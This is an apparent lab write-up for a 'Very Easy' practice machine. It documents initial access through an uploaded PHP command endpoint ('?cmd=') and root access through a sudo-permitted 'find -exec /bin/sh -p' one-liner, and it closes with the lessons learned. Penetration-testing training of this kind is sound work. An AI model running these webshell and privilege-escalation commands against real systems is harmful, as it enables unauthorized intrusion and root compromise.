---
type: machine-overview
project: OSCP-Exam-PoC
machine: VE-01
difficulty: Very Easy
platform: Linux
status: completed
initial_access: File Upload / PHP Command Execution
privilege_escalation: Sudo Misconfiguration
target: x.x.x.x
http_port: PORT_L
user_access: confirmed
root_access: confirmed
tags:
  - oscp
  - pentesting
  - very-easy
  - file-upload
  - php
  - command-injection
  - sudo
  - find
user_flag_submitted: true
root_flag_submitted: true
---

# VE-01 — Machine Overview

> **Flag completion:** User and root flags obtained and submitted (confirmed by the examination participant). Public value: `IT{FLAG-SECRET}`.

## 1. Machine Information

|Property|Value|
|---|---|
|Machine ID|VE-01|
|Difficulty|Very Easy|
|Target IP|`x.x.x.x`|
|HTTP Port|`PORT_L`|
|Application|Web application|
|Initial Access|File upload leading to PHP command execution|
|Initial Execution Context|`www-data`|
|User Account|`user`|
|Privilege Escalation|Sudo permission abuse through `/usr/bin/find`|
|Final Privilege|`root`|
|Machine Status|Completed|

**Application URL:**

```
http://x.x.x.x:PORT_L/
```

**Command execution endpoint:**

```
http://x.x.x.x:PORT_L/uploads/file.php?cmd=
```

## 2. Examination Objectives

### User-Level Objective

The examination required:

1. Obtain user-level access.
    
2. Locate the user's home directory.
    
3. Read `/home/user/user.txt`.
    
4. Submit the flag.
    

The objective was completed successfully.

### Root-Level Objective

After submitting the user flag, the second objective was to:

1. Escalate privileges to root.
    
2. Read `/root/root.txt`.
    
3. Submit the root flag.
    

The objective was completed successfully.

## 3. Attack Chain

<figure class="attack-chain-figure">
  <picture>
    <source media="(max-width: 520px)" type="image/svg+xml" srcset="/diagrams/ve-01-attack-chain-mobile.svg" />
    <img src="/diagrams/ve-01-attack-chain.svg" alt="VE-01 attack chain: a web file-upload vulnerability, uploaded PHP command execution as www-data, user flag submission, sudo /usr/bin/find -exec privilege escalation to UID 0, and root flag submission." width="760" height="1070" loading="lazy" decoding="async" />
  </picture>
  <figcaption>VE-01 attack path. User and root flag outcomes are participant-confirmed; raw flag values are not published.</figcaption>
</figure>

## 4. Reconnaissance Summary

The initial challenge exposed an HTTP application on port `PORT_L`.

The application contained a file-upload vulnerability, which provided the initial route to command execution.

The working directory obtained through the PHP command parameter was:

```
/var/www/html/uploads
```

The command used:

```
http://x.x.x.x:PORT_L/uploads/file.php?cmd=pwd
```

Response:

```
/var/www/html/uploads
```

This confirmed that the uploaded PHP file was executing commands on the target rather than merely being served as static content.

**Documentation limitation:** The examination record does not preserve the complete multipart upload request, the server's validation logic, or the exact sequence used to bypass file-upload restrictions. These details must not be reconstructed from assumptions.

## 5. Initial Access Summary

The initial access method was a file-upload vulnerability resulting in PHP command execution.

The working command execution endpoint was:

```
/uploads/file.php?cmd=
```

Commands were executed through the `cmd` query parameter.

The user directory was enumerated using:

```
ls -la /home
```

Captured output:

```
total 16
drwxr-xr-x 1 root root 4096 Nov  3 15:37 .
drwxr-xr-x 1 root root 4096 Nov  4 17:17 ..
drwx--x--x 1 user user 4096 Nov  4 17:17 user
```

The target username was therefore identified as:

```
user
```

The user flag was located at:

```
/home/user/user.txt
```

The flag was successfully retrieved and submitted.

**Flag outcome:** Obtained and submitted (participant-confirmed). Public value: `IT{FLAG-SECRET}`.

See [[Difficulty Levels/Very Easy/VE-01/user]].

## 6. Privilege Escalation Summary

The root objective required privilege escalation from the web application's execution context.

The following command was used to inspect sudo permissions:

```
sudo -l
```

Captured output:

```
Matching Defaults entries for www-data on veryeasy:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty, !requiretty

User www-data may run the following commands on veryeasy:
    (ALL) NOPASSWD: /usr/bin/find
```

The important finding was:

```
(ALL) NOPASSWD: /usr/bin/find
```

This allowed `www-data` to execute GNU `find` as root without password authentication.

GNU `find` supports the `-exec` action, which can execute an external command. Because the permitted binary was executed with root privileges, its `-exec` functionality could be used to launch a privileged shell command.

The exploitation command was:

```
sudo /usr/bin/find . -exec /bin/sh -p -c 'id; cat /root/root.txt' \; -quit
```

The command was delivered through the existing PHP command execution endpoint.

The root objective was completed, and the root flag was submitted successfully.

**Flag outcome:** Obtained and submitted (participant-confirmed). Public value: `IT{FLAG-SECRET}`.

See [[Difficulty Levels/Very Easy/VE-01/root]].

## 7. Technical Findings

|ID|Finding|Evidence|Result|
|---|---|---|---|
|VE-01-F01|File-upload vulnerability|Uploaded PHP command endpoint|Initial access|
|VE-01-F02|PHP command execution|`pwd` returned `/var/www/html/uploads`|OS command execution|
|VE-01-F03|User account discovery|`ls -la /home`|Identified `user`|
|VE-01-F04|Sudo misconfiguration|`sudo -l` output|Root execution of `/usr/bin/find`|
|VE-01-F05|GNU find privilege escalation|`-exec` execution through sudo|Root access|

## 8. Difficulties Encountered

The original VE-01 exchange did not record significant connectivity or tooling obstacles.

The main technical transition was moving from web-level command execution to Linux privilege-escalation enumeration.

The existing PHP command execution endpoint was sufficient for both user-level enumeration and the root-level exploitation command.

No reverse shell was required in the documented exploitation chain.

## 9. Reusable Techniques

### File Upload to PHP Command Execution

Relevant methodology:

- Understand the multipart upload mechanism.
    
- Identify the upload destination.
    
- Determine whether the server executes uploaded PHP files.
    
- Verify execution using a harmless probe.
    
- Preserve the resulting HTTP endpoint.
    

### Sudo Misconfiguration — GNU find

Relevant technique:

- Enumerate permitted sudo commands.
    
- Identify dangerous functionality in privileged binaries.
    
- Review the corresponding GTFOBins entry.
    
- Use the permitted binary's execution functionality to obtain elevated command execution.
    

Reference:

[GTFOBins — find](https://gtfobins.github.io/gtfobins/find/)

## 10. Evidence Index

|Evidence|Description|Status|
|---|---|---|
|Initial application URL|Target web application|Recorded|
|PHP command endpoint|`/uploads/file.php?cmd=`|Recorded|
|Working directory output|`/var/www/html/uploads`|Recorded|
|Home directory enumeration|Identified `/home/user`|Recorded|
|User flag|`/home/user/user.txt`| Obtained and submitted (participant-confirmed) |
|Sudo enumeration|`www-data` can run `/usr/bin/find` as root|Recorded|
|Root exploitation command|GNU find `-exec`|Recorded|
|Root flag|`/root/root.txt`| Obtained and submitted (participant-confirmed) |

The Evidence directory should eventually contain the original HTTP requests, responses, screenshots, and terminal output. The examination record alone does not contain all of these artifacts.

## 11. Lessons Learned

1. **Verify execution, not merely upload acceptance.** A successful upload does not establish that the uploaded file is executed by the server.
    
2. **Use the application context to establish the operating-system context.** The PHP endpoint provided a direct way to run enumeration commands without first obtaining an interactive shell.
    
3. **Inspect home-directory permissions carefully.** The user's home directory did not permit ordinary directory listing to everyone, but its execute permission allowed traversal when the filename was known.
    
4. **Always enumerate sudo permissions during Linux privilege escalation.** A single unrestricted binary permission was sufficient to compromise the machine.
    
5. **Understand the dangerous functionality of permitted binaries.** The relevant weakness was not a vulnerable version of `find`; it was the unrestricted use of its `-exec` functionality under sudo.
    

## 12. Related Documentation

- [[Dashboard]]
    
- [[Difficulty Levels/Very Easy/VE-01/user]]
    
- [[Difficulty Levels/Very Easy/VE-01/root]]
    
- [[Methodology/Initial Access]]
    
- [[Methodology/Linux Privilege Escalation]]
    

## Documentation Completion Checklist

- User objective documented
    
- Initial access method documented
    
- Command execution endpoint recorded
    
- User account identified
    
- Sudo permissions documented
    
- Privilege-escalation technique documented
    
- Root objective documented
    
- Original upload request and validation bypass recovered
    
- Raw user and root flag outputs attached
    
- Supporting evidence files collected